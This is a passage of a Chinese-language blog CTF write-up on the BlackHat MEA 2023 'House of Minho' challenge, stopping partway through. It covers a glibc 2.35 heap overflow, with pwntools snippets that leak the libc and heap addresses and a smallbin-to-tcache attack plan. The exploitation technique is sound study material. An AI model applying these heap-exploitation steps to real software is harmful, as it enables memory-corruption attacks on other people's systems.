@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>BlackHatMEA 2023 House of Minho | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="BlackHatMEA 2023 House of Minho" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome 本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。" />
+<meta property="og:description" content="参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome 本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。" />
+<link rel="canonical" href="https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho.html" />
+<meta property="og:url" content="https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-18T21:22:03+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="BlackHatMEA 2023 House of Minho" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-18T21:22:03+08:00","datePublished":"2024-04-18T21:22:03+08:00","description":"参考以及题目附件见：Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome 本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。","headline":"BlackHatMEA 2023 House of Minho","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho.html"},"url":"https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">BlackHatMEA 2023 House of Minho</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-04-18T21:22:03+08:00" itemprop="datePublished">Apr 18, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>参考以及题目附件见：<a href="https://bbs.kanxue.com/thread-279588.htm">Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome</a>
+本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。</p>
+
+<h2 id="程序概况">程序概况</h2>
+
+<p>容器环境：Ubuntu22.04（GLIBC2.35）（本文使用 GLIBC 2.35-0ubuntu3_amd64 进行调试）
+保护情况：全部开启</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/cameudis/ctf/practice/houseofminho/pwn'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+</code></pre></div></div>
+
+<p>附件里提供了程序源码：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define SIZE_SMALL 0x40
+#define SIZE_BIG   0x80
+</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">g_buf</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">getint</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">val</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"1. new</span><span class="se">\n</span><span class="s">2. show</span><span class="se">\n</span><span class="s">3. delete"</span><span class="p">);</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">getint</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span> <span class="p">{</span> <span class="cm">/* new */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Buffer in use"</span><span class="p">);</span>
+          <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">getint</span><span class="p">(</span><span class="s">"Size [1=small / 2=big]: "</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">g_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">SIZE_SMALL</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="n">g_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">SIZE_BIG</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">g_buf</span><span class="p">,</span> <span class="n">SIZE_BIG</span><span class="p">);</span>  <span class="c1">// overflow</span>
+        <span class="n">g_buf</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">g_buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> <span class="p">{</span> <span class="cm">/* show */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Empty buffer"</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">g_buf</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span> <span class="p">{</span> <span class="cm">/* delete */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">g_buf</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Empty buffer"</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="n">free</span><span class="p">(</span><span class="n">g_buf</span><span class="p">);</span>
+          <span class="n">g_buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="nl">default:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Bye!"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>漏洞点：不难发现，在 new 功能中，不管我们选择 small 还是 big，最后都能读入 SIZE_BIG 字节，存在 0x40 字节的堆溢出。</p>
+
+<p>但是除了漏洞以外，我们的能力非常少：只能分配 0x40 或者 0x80 大小的堆块，只能同时使用一个堆块，只能在申请出来的时候 edit。</p>
+
+<h2 id="攻击思路概括">攻击思路概括</h2>
+
+<p>首先可以想到，对该大小的堆块可以进行 tcache 相关的攻击，比如 tcache poisoning -&gt; House of Apple2。</p>
+
+<p>为了实施 tcache poisoning，在高版本的 GLIBC 中有一个限制就是还要考虑到对应 bin 的 count。在本题中，我们没办法同时申请到两个堆块，因此无法通过 <code class="language-plaintext highlighter-rouge">free()</code> 来往某个 bin 中放入两个 chunk。</p>
+
+<p>值得注意的是，不只是 <code class="language-plaintext highlighter-rouge">free()</code> 函数会将堆块放入 tcache。在 <code class="language-plaintext highlighter-rouge">malloc()</code> 从 smallbin 取堆块的过程中，如果 smallbin 中取出一个堆块后仍有剩余，并且相应的 tcache 未满，则会触发一个循环，将剩余的 smallbin 中的堆块转移到 tcache 中：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+      <span class="n">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span>
+        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">);</span>
+          <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+          <span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
+        <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+          <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+<span class="cp">#if USE_TCACHE
+</span>      <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>
+          <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span>
+             <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span>
+        <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="p">{</span>
+              <span class="n">bck</span> <span class="o">=</span> <span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+              <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
+            <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">);</span>
+              <span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+              <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
+              <span class="n">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span> 
+                <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="p">}</span>
+<span class="cp">#endif
+</span>          <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+          <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+          <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>我们可以尝试利用这个过程，往 tcache 填入更多的区块。</p>
+
+<blockquote>
+  <p>其实看源码可以发现，在取出 smallbin 区块放到 tcache 的过程中，代码并没有做任何检查。也就是说，如果能够 UAF 或溢出修改一个 smallbin 中的 bk 指针，就可以伪造一条 smallbin 链表，往 tcache 中填入任意地址。这个技巧之后也会用到。</p>
+</blockquote>
+
+<p>但是这又遇到了问题：怎么往 smallbin 里面放入至少两个堆块？我们至少要使 bk 链表存在 2+个堆块，才能使某些堆块进入 tcache。</p>
+
+<p>好吧，让我们先把问题简化成：怎么往 smallbin 里面放入一个堆块？<code class="language-plaintext highlighter-rouge">malloc()</code> 会在 unsorted bin 大循环中迭代每一个其中的堆块，并把他们放到对应大小的 bin 中。所以想在 smallbin 中放一个堆块，得首先使一个 smallbin 大小的堆块被放到 unsorted bin 之中。</p>
+
+<p>考虑到 small bin 大小都属于 tcache 大小，这个步骤很难完成。但注意到堆溢出可以帮助简化这个流程：先把一个很大的堆块放到 unsorted bin 中，再溢出把它的大小改小即可。</p>
+
+<p>如何把一个很大的堆块放到 unsorted bin 中？其实这个很好办，在本题中我们会用到两个受限情况下很好用的 trick：</p>
+
+<ol>
+  <li>
+    <p>溢出修改 Top Chunk 的 size 域，将 0x??XYZ 覆盖为 0xXYZ 后，再申请一个很大的堆块，就可以将 Top Chunk 回收到 unsorted bin 中。（这个技巧来自 house of orange）</p>
+  </li>
+  <li>
+    <p>如果程序没有使用 <code class="language-plaintext highlighter-rouge">setbuf(stdin, 0)</code> 关闭标准输入流的缓冲功能，那么在程序使用 <code class="language-plaintext highlighter-rouge">scanf()</code> 读取很长的数据时，会使用 malloc 和 realloc 分配临时的缓冲区，并在使用完毕后使用 <code class="language-plaintext highlighter-rouge">free()</code> 将其释放。举例：如果 scanf 读入数据长度为 0x1000，那么会产生如下调用：</p>
+  </li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x800</span><span class="p">);</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">);</span>
+<span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>组合使用这两个 trick ，就可以往 unsorted bin 放入一个很大的堆块。并且后续也可以用第二个 trick 触发 unsorted bin 的遍历。</p>
+
+<p>初次以外，本题中我们还需要使用第二个 trick 来往堆上预先放置一些数据。（这个技巧真的很牛）</p>
+
+<p>具体利用时，还需要处理很多细节，步骤并不像这里说的这么直接。</p>
+
+<h2 id="具体攻击流程解析">具体攻击流程解析</h2>
+
+<h3 id="信息泄漏">信息泄漏</h3>
+
+<p>本次攻击需要我们泄漏堆地址以及 LIBC 基址。</p>
+
+<p>关于 LIBC 基址，只要将堆块释放到 unsorted bin 中再泄漏 fd 即可。这里我们使用 house of orange 所用到的 trick，将 top chunk size 溢出修改后，借用 <code class="language-plaintext highlighter-rouge">scanf()</code> 的缓冲区来触发 <code class="language-plaintext highlighter-rouge">malloc()</code>，将 top chunk 释放进入 unsorted bin。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd11</span><span class="p">))</span> <span class="c1"># original top chunk size: 0x??d11
+</span><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xfff</span><span class="o">+</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span> <span class="c1"># trigger realloc to put top chunk into unsorted bin
+</span></code></pre></div></div>
+
+<p>然后，再触发一个溢出来把 fd 读出来，就可以计算出 libc 基址。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># overflow
+</span><span class="n">show</span><span class="p">()</span>
+<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcf1</span><span class="p">))</span> <span class="c1"># repair corrupted size
+</span></code></pre></div></div>
+
+<p>关于堆地址，最容易泄漏的是已释放堆块的 fd 指针。在本题中，我们只能接触到 tcache，但这不妨碍我们进行泄漏。</p>
+
+<p>在 GLIBC 高版本中，虽然 tcache chunk 的 fd 指针会进行异或加密，但是用于加密的 key 本身就是堆地址 » 12，再考虑到 tcache bin 都是单向非循环链表，我们只要泄漏最后面的 chunk 的 fd 指针，就可以拿到堆地址。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="p">)</span> <span class="c1"># this chunk is split from old top chunk in unsorted bin
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span> <span class="c1"># overflow
+</span><span class="n">show</span><span class="p">()</span>
+<span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">)</span>
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="c1"># leak tcache protect key
+</span><span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+<span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="smallbin-to-tcache本题关键">smallbin to tcache（本题关键）</h3>
+
+<p>注意到，现在的堆布局在修复部分数据后，大致为这样：</p>
+
+<pre><code class="language-pwndbg">Allocated chunk | PREV_INUSE
+Addr: 0x5d6c2a054000
+Size: 0x290 (with flag bits: 0x291)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5d6c2a054290
+Size: 0x1010 (with flag bits: 0x1011)
+
+Free chunk (tcachebins) | PREV_INUSE
+Addr: 0x5d6c2a0552a0
+Size: 0x50 (with flag bits: 0x51)
+fd: 0x5d6c2a055
+
+Free chunk (tcachebins) | PREV_INUSE
+Addr: 0x5d6c2a0552f0
+Size: 0x90 (with flag bits: 0x91)
+fd: 0x5d6c2a055
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x5d6c2a055380
+Size: 0xc60 (with flag bits: 0xc61)
+fd: 0x7e3344a19ce0
+bk: 0x7e3344a19ce0
+
+Allocated chunk
+Addr: 0x5d6c2a055fe0
+Size: 0x10 (with flag bits: 0x10)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5d6c2a055ff0
+Size: 0x10 (with flag bits: 0x11)
+</code></pre>
+
+<blockquote>
+  <p><strong>位于原先的 top chunk 之后的两个 0x10 大小区块是什么？</strong>
+在释放 top chunk 时，为了让 top chunk 在之后 <strong><code class="language-plaintext highlighter-rouge">malloc()</code> 遍历 unsorted bin 时</strong> 通过其中的各种检查，GLIBC 会预先在 top chunk 的最后放两个小区块。</p>
+
+  <p>具体检查包括：</p>
+  <ol>
+    <li>当前堆块的 size 是否满足 0x10 &lt;= size &lt;= system_mem</li>
+    <li>后一堆块的 size 是否满足 0x10 &lt;= size &lt;= system_mem</li>
+    <li>后一堆块的 prev_size 是否和当前堆块的 size 相等</li>
+    <li>当前堆块的 bck-&gt;fd 是否等于自己，以及 fd 是否指向 unsorted bin（注意这里使用的是前遍历）</li>
+    <li>后一堆块的 prev_inuse 是否为 0</li>
+  </ol>
+</blockquote>
+
+<p>我们之后需要 small bin 中至少有两个堆块，根据前文所述，我们可以先往其中塞一个堆块，然后使用溢出，来伪造一条 small bin 的 bk 链表。</p>
+
+<p>我们的目标是 <code class="language-plaintext highlighter-rouge">smallbin[0x90]</code>，且后续需要一次绕过 tcache 的请求来触发 unsorted bin 大循环，将区块放入 <code class="language-plaintext highlighter-rouge">smallbin[0x90]</code> ，也就是说需要满足以下条件：</p>
+
+<ol>
+  <li>在 unsorted bin 中需要有一个 0x90 大小的堆块（这个 0x90 可以在堆块进入 unsorted bin 之后再使用溢出修改）；</li>
+  <li>需要有一次大于 0x90 的 <code class="language-plaintext highlighter-rouge">malloc()</code>，且不能命中 Tcache。（用 scanf 就行了）</li>
+</ol>
+
+<p>现在在 tcache 中就有一个现成的 0x90 大小区块，一种想法是将其 size 改大后将其释放。问题在于，free() 为了进行后向合并，会检查后续区块的一些合法性，而由于 size 很大，我们不能够通过溢出来布置后续的 fake chunk。（注意区分这里 <code class="language-plaintext highlighter-rouge">free()</code> 对释放区块的检查以及 <code class="language-plaintext highlighter-rouge">malloc()</code> 对于 unsorted bin 中的区块的检查）</p>
+
+<p>如果将要释放的堆块记为 chunk A，那么后续两个 chunk 需要满足：</p>
+<ul>
+  <li>chunk B：PREV_IN_USE 为 1</li>
+  <li>chunk C：PREV_IN_USE 为 1
+这样，<code class="language-plaintext highlighter-rouge">free()</code> 就不会尝试去合并后面的堆块。</li>
+</ul>
+
+<p>这里我们可以采用一种技巧来在堆上<em>提前布置</em>一些数据。之前提到，<code class="language-plaintext highlighter-rouge">scanf()</code> 会在堆上申请缓冲区，因此它一定会把读入的数据存在堆上。我们可以利用这种技术在堆上提前布置 fake chunk 的数据。</p>
+
+<p>在 EXP 中，我们复用了 unsorted bin 的第二个哨兵堆块，并在后面使用技巧布置了一个哨兵堆块。</p>
+
+<pre><code class="language-pwndbg">Free chunk (tcachebins) | PREV_INUSE
+Addr: 0x5ef482d912a0
+Size: 0x50 (with flag bits: 0x51)
+fd: 0x5ef482d91
+
+Free chunk (tcachebins) | PREV_INUSE
+Addr: 0x5ef482d912f0
+Size: 0x90 (with flag bits: 0x91)
+fd: 0x5ef482d91
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x5ef482d91380
+Size: 0xc60 (with flag bits: 0xc61)
+fd: 0x7cb42c819ce0
+bk: 0x7cb42c819ce0
+
+Allocated chunk
+Addr: 0x5ef482d91fe0
+Size: 0x10 (with flag bits: 0x10)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5ef482d91ff0
+Size: 0x10 (with flag bits: 0x11)
+
+Allocated chunk | PREV_INUSE | IS_MMAPED
+Addr: 0x5ef482d92000
+Size: 0x30 (with flag bits: 0x33) &lt;- 这个0x33的byte就是提前布置的
+
+Allocated chunk
+Addr: 0x5ef482d92030
+Size: 0x00 (with flag bits: 0x00)
+</code></pre>
+
+<p>为了提前布置数据，我们在泄漏数据之前加入这样一行代码：</p>
+
